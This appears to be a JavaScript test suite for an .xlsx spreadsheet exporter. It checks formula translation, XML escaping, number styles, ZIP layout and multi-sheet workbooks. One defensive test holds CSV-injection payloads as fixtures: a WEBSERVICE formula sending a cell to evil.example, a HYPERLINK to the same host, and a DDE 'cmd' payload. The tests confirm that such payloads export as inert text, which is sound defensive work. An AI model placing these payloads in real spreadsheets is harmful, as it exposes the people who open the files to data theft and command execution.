// test-cells-xlsx.js - the .xlsx writer for ```cells sheets.
//
// SDocCellsXlsx builds a real Excel workbook (Office Open XML SpreadsheetML
// in a stored, uncompressed ZIP) from a cell model: numbers as values, text
// as inline strings, =formulas as live Excel formulas that recalculate on
// open. Because the ZIP is stored (no compression), tests can assert on the
// raw bytes directly.
//
// Security contract (the CSV-injection guard): a formula may only export as
// a live Excel formula when our engine evaluated it - proof it stays inside
// our purely computational grammar. Unknown functions (WEBSERVICE, HYPERLINK,
// DDE payloads, VLOOKUP...) export as inert text.
const assert = require('assert');
const path = require('path');

module.exports = (h) => {
  const { test } = h;
  const XLSX = require(path.join(__dirname, '..', 'public', 'sdocs-cells-xlsx.js'));
  const CELLS = require(path.join(__dirname, '..', 'public', 'sdocs-cells.js'));
  const FX = require(path.join(__dirname, '..', 'public', 'sdocs-cells-formula.js'));

  const bytesToStr = (bytes) => Buffer.from(bytes).toString('latin1');

  // ── CRC32 ───────────────────────────────────────────────
  test('xlsx: crc32 matches the standard test vector', () => {
    // CRC-32 of the ASCII string "123456789" is 0xCBF43926.
    const data = new TextEncoder().encode('123456789');
    assert.strictEqual(XLSX.crc32(data) >>> 0, 0xcbf43926);
  });

  // ── Formula translation ─────────────────────────────────
  test('xlsx: excelFormula strips the = and keeps Excel-native functions', () => {
    assert.strictEqual(XLSX.excelFormula('=SUM(B2:B5)'), 'SUM(B2:B5)');
    assert.strictEqual(XLSX.excelFormula('=B2*C2'), 'B2*C2');
    assert.strictEqual(XLSX.excelFormula('=IF(B2>20, 1, 0)'), 'IF(B2>20, 1, 0)');
  });

  test('xlsx: excelFormula maps AVG (our alias) to Excel\'s AVERAGE', () => {
    assert.strictEqual(XLSX.excelFormula('=AVG(B2:B5)'), 'AVERAGE(B2:B5)');
    assert.strictEqual(XLSX.excelFormula('=avg(B2:B5)'), 'AVERAGE(B2:B5)');
    // AVERAGE itself passes through untouched (no AVERAGEAGE mangling).
    assert.strictEqual(XLSX.excelFormula('=AVERAGE(B2:B5)'), 'AVERAGE(B2:B5)');
    // Nested calls are renamed too.
    assert.strictEqual(XLSX.excelFormula('=ROUND(AVG(B2:B5), 1)'), 'ROUND(AVERAGE(B2:B5), 1)');
  });

  // ── Worksheet XML ───────────────────────────────────────
  test('xlsx: sheetXml emits numbers, inline strings, and formulas', () => {
    const model = CELLS.parseCells('Item,Qty\nLaptop,12\nTotal,=SUM(B2:B2)');
    const fx = FX.recalc(model);
    const xml = XLSX.sheetXml(model, fx);
    assert.ok(xml.indexOf('<is><t xml:space="preserve">Item</t></is>') >= 0, 'text as inline string');
    assert.ok(xml.indexOf('<c r="B2"><v>12</v></c>') >= 0, 'number as value');
    assert.ok(xml.indexOf('<f>SUM(B2:B2)</f>') >= 0, 'formula with = stripped');
    assert.ok(xml.indexOf('<f>SUM(B2:B2)</f><v>12</v>') >= 0, 'cached formula result');
  });

  test('xlsx: sheetXml escapes XML special characters in text', () => {
    const model = CELLS.parseCells('a\n"<b> & </b>"');
    const xml = XLSX.sheetXml(model, null);
    assert.ok(xml.indexOf('&lt;b&gt; &amp; &lt;/b&gt;') >= 0, 'escaped entities present');
    assert.ok(xml.indexOf('<b>') < 0, 'no raw markup leaks through');
  });

  test('xlsx: sheetXml skips empty cells and empty rows', () => {
    const model = CELLS.parseCells('a,,c\n,,');
    const xml = XLSX.sheetXml(model, null);
    // Row 2 is all-empty: no <row r="2">. Cell B1 is empty: no <c r="B1">.
    assert.ok(xml.indexOf('<row r="2">') < 0, 'empty row skipped');
    assert.ok(xml.indexOf('r="B1"') < 0, 'empty cell skipped');
    assert.ok(xml.indexOf('r="A1"') >= 0 && xml.indexOf('r="C1"') >= 0, 'real cells kept');
  });

  test('xlsx: a formula whose evaluation failed emits the formula without a cached value', () => {
    const model = CELLS.parseCells('a\n=1/0');
    const fx = FX.recalc(model);
    const xml = XLSX.sheetXml(model, fx);
    assert.ok(xml.indexOf('<f>1/0</f>') >= 0, 'formula exported');
    assert.ok(xml.indexOf('<f>1/0</f><v>') < 0, 'no cached value for an error');
  });

  // ── Formula laundering (CSV-injection) protection ───────
  // The browser renderer is inert for unknown functions (they show #NAME?),
  // but the .xlsx download is opened in Excel where WEBSERVICE / HYPERLINK /
  // DDE payloads are live. A formula may only export as a live Excel formula
  // when OUR engine evaluated it. Everything else exports as inert text.
  test('xlsx: dangerous / unknown Excel functions export as inert text, never as formulas', () => {
    const payloads = [
      '=WEBSERVICE("http://evil.example/?leak="&A1)',
      '=HYPERLINK("http://evil.example","Total")',
      "=cmd|'/c calc'!A0",
      '=VLOOKUP(A1,B:C,2)',
    ];
    const src = 'a\n' + payloads.map(p => '"' + p.replace(/"/g, '""') + '"').join('\n');
    const model = CELLS.parseCells(src);
    const fx = FX.recalc(model);
    const xml = XLSX.sheetXml(model, fx);
    assert.ok(xml.indexOf('<f>') < 0, 'no live formulas at all, got: ' + xml);
    assert.ok(xml.indexOf('t="inlineStr"') >= 0, 'payloads exported as inline strings');
    assert.ok(xml.indexOf('WEBSERVICE') >= 0, 'payload text still visible (inert)');
  });

  test('xlsx: without evaluation results (fx=null) formulas export as text, not live', () => {
    const model = CELLS.parseCells('a\n=SUM(A1:A1)');
    const xml = XLSX.sheetXml(model, null);
    assert.ok(xml.indexOf('<f>') < 0, 'no fx = no live formulas');
    assert.ok(xml.indexOf('=SUM(A1:A1)') >= 0, 'formula text kept as inert content');
  });

  test('xlsx: computational runtime errors (#DIV/0!, #CIRC!) still export live', () => {
    const model = CELLS.parseCells('a,b\n=1/0,=B2');
    const fx = FX.recalc(model);   // A2 -> #DIV/0!, B2 -> #CIRC! (self reference)
    const xml = XLSX.sheetXml(model, fx);
    assert.ok(xml.indexOf('<f>1/0</f>') >= 0, '#DIV/0! formula stays live');
    assert.ok(xml.indexOf('<f>B2</f>') >= 0, '#CIRC! formula stays live');
  });

  test('xlsx: syntax-broken formulas (#VALUE!) export as text - Excel could not parse them either', () => {
    const model = CELLS.parseCells('a\n"=SUM("');
    const fx = FX.recalc(model);
    const xml = XLSX.sheetXml(model, fx);
    assert.ok(xml.indexOf('<f>') < 0, 'broken syntax never exports as a formula');
    assert.ok(xml.indexOf('=SUM(') >= 0, 'kept as visible text');
  });

  // ── Number formats (format: directive -> styles) ────────
  test('xlsx: format directive columns carry a style index', () => {
    const model = CELLS.parseCells('format: B=$ C=%\nItem,Price,Margin\nA,1100,0.262');
    const xml = XLSX.sheetXml(model, null);
    // B2 (currency) and C2 (percent) get s= style attributes; A2 (text) does not.
    assert.ok(/<c r="B2" s="[0-9]+"><v>1100<\/v><\/c>/.test(xml), 'currency cell styled: ' + xml);
    assert.ok(/<c r="C2" s="[0-9]+"><v>0\.262<\/v><\/c>/.test(xml), 'percent cell styled');
    assert.ok(xml.indexOf('<c r="A2" t="inlineStr"><is>') >= 0, 'text cell unstyled');
  });

  test('xlsx: stylesXml defines currency and percent number formats', () => {
    const model = CELLS.parseCells('format: B=$ C=%\na,b,c\nx,1,0.5');
    const xml = XLSX.stylesXml(model);
    assert.ok(xml.indexOf('$#,##0.00') >= 0, 'currency format code');
    assert.ok(xml.indexOf('%') >= 0, 'percent format code');
    assert.ok(xml.indexOf('<cellXfs') >= 0, 'cell format records');
  });

  // ── The full workbook (ZIP) ─────────────────────────────
  test('xlsx: buildXlsx returns a stored ZIP with the workbook parts', () => {
    const model = CELLS.parseCells('Item,Qty\nLaptop,12\nTotal,=SUM(B2:B2)');
    const fx = FX.recalc(model);
    const bytes = XLSX.buildXlsx(model, fx);
    const s = bytesToStr(bytes);
    assert.ok(bytes instanceof Uint8Array, 'returns bytes');
    assert.strictEqual(bytes[0], 0x50);                  // "P"
    assert.strictEqual(bytes[1], 0x4b);                  // "K"
    assert.ok(s.indexOf('[Content_Types].xml') >= 0);
    assert.ok(s.indexOf('xl/workbook.xml') >= 0);
    assert.ok(s.indexOf('xl/worksheets/sheet1.xml') >= 0);
    assert.ok(s.indexOf('xl/styles.xml') >= 0);
    assert.ok(s.indexOf('_rels/.rels') >= 0);
  });

  test('xlsx: the workbook recalculates formulas on open (fullCalcOnLoad)', () => {
    const model = CELLS.parseCells('a\n=1+1');
    const bytes = XLSX.buildXlsx(model, FX.recalc(model));
    const s = bytesToStr(bytes);
    // The ZIP is stored (uncompressed) so the workbook XML is readable in place.
    assert.ok(s.indexOf('fullCalcOnLoad="1"') >= 0, 'recalc-on-open flag set');
    assert.ok(s.indexOf('<f>1+1</f>') >= 0, 'formula present and live');
  });

  test('xlsx: zip entries carry correct sizes for a stored archive', () => {
    const model = CELLS.parseCells('a,b\n1,2');
    const bytes = XLSX.buildXlsx(model, null);
    // Walk local file headers: signature PK\x03\x04, method 0 (stored),
    // compressed size === uncompressed size.
    let i = 0, entries = 0;
    const view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
    while (i < bytes.length && view.getUint32(i, true) === 0x04034b50) {
      const method = view.getUint16(i + 8, true);
      const csize = view.getUint32(i + 18, true);
      const usize = view.getUint32(i + 22, true);
      const nameLen = view.getUint16(i + 26, true);
      const extraLen = view.getUint16(i + 28, true);
      assert.strictEqual(method, 0, 'entry is stored, not compressed');
      assert.strictEqual(csize, usize, 'stored sizes match');
      i += 30 + nameLen + extraLen + csize;
      entries++;
    }
    assert.strictEqual(entries, 6, 'content types, .rels, workbook, wb rels, styles, sheet');
  });

  // ── Multi-sheet workbook export (a cells "workbook" group -> one .xlsx) ──

  test('xlsx: single-sheet buildXlsx keeps the legacy hardcoded sheet (byte-stable path)', () => {
    const s = bytesToStr(XLSX.buildXlsx(CELLS.parseCells('a\n1'), null));
    assert.ok(s.indexOf('<sheet name="Sheet1" sheetId="1" r:id="rId1"/>') >= 0);
  });

  test('xlsx: buildXlsxWorkbook emits a worksheet part + a Content-Types Override per sheet', () => {
    const a = CELLS.parseCells('sdoc-cells: name="A"\nx\n1');
    const b = CELLS.parseCells('sdoc-cells: name="B"\ny\n2');
    const s = bytesToStr(XLSX.buildXlsxWorkbook([{ name: 'A', model: a }, { name: 'B', model: b }], []));
    assert.ok(s.indexOf('xl/worksheets/sheet1.xml') >= 0);
    assert.ok(s.indexOf('xl/worksheets/sheet2.xml') >= 0);
    const overrides = (s.match(/Override PartName="\/xl\/worksheets\/sheet\d+\.xml"/g) || []).length;
    assert.strictEqual(overrides, 2, 'one worksheet content-type override per sheet');
  });

  test('xlsx: workbook rels give each sheet a unique rId and styles a distinct one', () => {
    const a = CELLS.parseCells('sdoc-cells: name="A"\nx\n1');
    const b = CELLS.parseCells('sdoc-cells: name="B"\ny\n2');
    const s = bytesToStr(XLSX.buildXlsxWorkbook([{ name: 'A', model: a }, { name: 'B', model: b }], []));
    assert.ok(s.indexOf('Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"') >= 0);
    assert.ok(s.indexOf('Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet2.xml"') >= 0);
    assert.ok(s.indexOf('Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles"') >= 0);
    // sheetId (tab id) and r:id (rels pointer) stay aligned - crossing them makes Excel refuse the file.
    assert.ok(s.indexOf('<sheet name="A" sheetId="1" r:id="rId1"/>') >= 0);
    assert.ok(s.indexOf('<sheet name="B" sheetId="2" r:id="rId2"/>') >= 0);
  });

  test('xlsx: sheet names are sanitized to Excel rules and de-duped case-insensitively', () => {
    assert.strictEqual(XLSX.sanitizeSheetName('P&L: 2026 [draft]/v2'), 'P&L 2026 draft v2');
    assert.strictEqual(XLSX.sanitizeSheetName('X'.repeat(40)).length, 31);
    assert.strictEqual(XLSX.sanitizeSheetName(''), 'Sheet');
    assert.deepStrictEqual(XLSX.dedupeSheetNames(['Data', 'data', 'DATA']), ['Data', 'data~2', 'DATA~3']);
  });

  test('xlsx: a cross-sheet formula stays a live formula pointing at its sibling tab', () => {
    const drv = CELLS.parseCells('sdoc-cells: name="Drivers"\na\n5');
    const mdl = CELLS.parseCells('sdoc-cells: name="Model"\nt,=Drivers!A2*2');
    const grids = FX.recalcWorkbook([{ name: 'Drivers', model: drv }, { name: 'Model', model: mdl }]);
    const s = bytesToStr(XLSX.buildXlsxWorkbook([{ name: 'Drivers', model: drv }, { name: 'Model', model: mdl }], grids));
    assert.ok(s.indexOf('<f>Drivers!A2*2</f>') >= 0, 'cross-sheet reference exported as a live formula');
  });

  test('xlsx: a renamed/spaced target tab gets single-quoted in the formula', () => {
    // If a tab name sanitised to something with a space, the qualifier must quote it.
    assert.strictEqual(XLSX.excelFormula('=Drivers!B2+1', { drivers: 'Rev by Region' }), "'Rev by Region'!B2+1");
    // A plain identifier stays bare; a cell-address-like name is quoted.
    assert.strictEqual(XLSX.excelFormula('=Model!A1', { model: 'Model' }), 'Model!A1');
    assert.strictEqual(XLSX.excelFormula('=AB12!A1', { ab12: 'AB12' }), "'AB12'!A1");
  });

  test('xlsx: a single-sheet export degrades a cross-sheet formula to its value (no broken external link)', () => {
    const npv = CELLS.parseCells('sdoc-cells: name="NPV"\nY,R\n1,=Assumptions!B2*2');
    const asm = CELLS.parseCells('sdoc-cells: name="Assumptions"\nk,v\nbase,21');
    const grids = FX.recalcWorkbook([{ name: 'NPV', model: npv }, { name: 'Assumptions', model: asm }]);
    // Alone, NPV cannot reach Assumptions, so the formula must NOT ship as a
    // live link; it lands as its computed value (21*2 = 42) instead.
    const single = bytesToStr(XLSX.buildXlsx(npv, grids[0]));
    assert.ok(single.indexOf('Assumptions!') < 0, 'no dangling cross-sheet reference in a single-sheet export');
    assert.ok(single.indexOf('<v>42</v>') >= 0, 'the cell carries the computed value');
    // In the full workbook the sibling IS present, so it stays a live formula.
    const book = bytesToStr(XLSX.buildXlsxWorkbook([{ name: 'NPV', model: npv }, { name: 'Assumptions', model: asm }], grids));
    assert.ok(book.indexOf('<f>Assumptions!B2*2</f>') >= 0, 'the workbook export keeps the cross-sheet formula live');
  });

  test('xlsx: workbook entry count is the 5 fixed parts plus one per sheet', () => {
    const mk = (n) => CELLS.parseCells('sdoc-cells: name="' + n + '"\nx\n1');
    const bytes = XLSX.buildXlsxWorkbook([{ name: 'A', model: mk('A') }, { name: 'B', model: mk('B') }, { name: 'C', model: mk('C') }], []);
    let i = 0, entries = 0;
    const view = new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength);
    while (i < bytes.length && view.getUint32(i, true) === 0x04034b50) {
      const nameLen = view.getUint16(i + 26, true);
      const extraLen = view.getUint16(i + 28, true);
      const csize = view.getUint32(i + 18, true);
      i += 30 + nameLen + extraLen + csize;
      entries++;
    }
    assert.strictEqual(entries, 8, '5 fixed parts + 3 sheets');
  });
};
